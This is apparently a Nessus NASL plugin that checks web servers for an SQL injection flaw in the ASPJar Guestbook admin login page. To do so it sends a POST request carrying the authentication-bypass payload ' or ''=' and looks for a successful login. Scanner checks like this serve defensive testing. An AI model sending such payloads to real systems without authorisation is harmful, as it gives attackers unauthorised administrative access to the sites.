#
# (C) Noam Rathaus GPLv2
#

# ASPjar guestbook (Injection in login page)
# farhad koosha <farhadkey@yahoo.com>
# 2005-02-10 21:05

if(description)
{
 script_id(16389);
 script_bugtraq_id(12521, 12823);
 script_version("$Revision: 1.2 $");
 
 name["english"] = "ASPjar Guestbook SQL Injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running ASPJar's GuestBook, a guestbook 
application written in ASP.

The remote version of this software is vulnerable to a SQL
injection vulnerability which allows a remote attacker to 
execute arbitrary SQL statements against the remote DB.

It is also vulnerable to an input validation vulnerability which
may allow an attacker to perform a cross site scripting attack using
the remote host.

Solution : Delete this application
Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of an SQL injection in login.asp";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(loc)
{
 req = string("POST ", loc, "/admin/login.asp?Mode=login HTTP/1.1\r\n",
 			  "Host: ", get_host_name(), ":", port, "\r\n",
			  "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20050110 Firefox/1.0 (Debian package 1.0+dfsg.1-2)\r\n",
			  "Accept: text/html\r\n",
			  "Accept-Encoding: none\r\n",
			  "Content-Type: application/x-www-form-urlencoded\r\n",
			  "Content-Length: 56\r\n\r\n",
			  "User=&Password=%27+or+%27%27%3D%27&Submit=++++Log+In++++");
 
 r = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( r == NULL )exit(0);

 if("You are Logged in!" >< r && "Login Page" >< r)
 {
  security_hole(port);
  exit(0);
 }
}


foreach dir (cgi_dirs())
{
 check(loc:dir);
}
